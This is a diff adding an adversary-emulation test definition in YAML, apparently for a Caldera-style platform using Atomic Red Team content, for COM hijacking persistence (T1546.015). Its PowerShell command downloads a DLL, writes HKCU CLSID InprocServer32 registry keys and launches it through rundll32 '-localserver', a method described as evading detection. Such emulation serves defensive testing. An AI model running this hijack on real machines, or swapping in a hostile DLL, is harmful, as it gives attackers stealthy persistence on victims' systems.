@@ -1,0 +1,70 @@
+- id: 123520cc-e998-471b-a920-bd28e3feafa0
+  name: COM Hijacking with RunDLL32 (Local Server Switch)
+  description: "This test uses PowerShell to hijack a reference to a Component Object\
+    \ Model by creating registry values under InprocServer32 key in the HKCU hive\
+    \ then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\"\
+    . \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]'\
+    \ to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\n\
+    Upon successful execution of this test with the default options, whenever certain\
+    \ apps are opened (for example, Notepad), a calculator window will also be opened."
+  tactic: persistence
+  technique:
+    attack_id: T1546.015
+    name: 'Event Triggered Execution: Component Object Model Hijacking'
+  platforms:
+    windows:
+      psh:
+        command: 'if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\T1546.015_calc.dll")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+          -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015_calc.dll"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1546.015_calc.dll"; fi;
+          New-Item -Path ''HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}''
+          -Value ''MSAA AccPropServices''; New-Item -Path ''HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32''
+          -Value "PathToAtomicsFolder\..\ExternalPayloads\T1546.015_calc.dll"; New-ItemProperty
+          -Path ''HKCU:\SOFTWARE\Classes\CLSID\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\InprocServer32''
+          -Name ''ThreadingModel'' -Value ''Both'' -PropertyType "String"; Start-Process
+          -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList ''-localserver
+          {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'''
+        cleanup: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Recurse
+          -ErrorAction Ignore
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - persistence
+  - t1546.015
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      clsid_threading:
+        description: Threading Model
+        type: string
+        default: Both
+      dll_path:
+        description: Path to the DLL.
+        type: string
+        default: PathToAtomicsFolder\..\ExternalPayloads\T1546.015_calc.dll
+      clsid:
+        description: Class ID to hijack.
+        type: string
+        default: '{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'
+      clsid_description:
+        description: Description for CLSID
+        type: string
+        default: MSAA AccPropServices
+    dependencies:
+    - description: DLL For testing
+      prereq_command: if (Test-Path "#{dll_path}") {exit 0} else {exit 1}
+      get_prereq_command: 'New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\"
+        -ErrorAction Ignore -Force | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015_calc.dll"
+        -OutFile "#{dll_path}"
+
+        '
+    technique_created: '2020-03-16T14:12:47.923Z'
+    atomic_guid: 123520cc-e998-471b-a920-bd28e3feafa0
+    import_timestamp: '2025-06-24T11:15:05.349432Z'
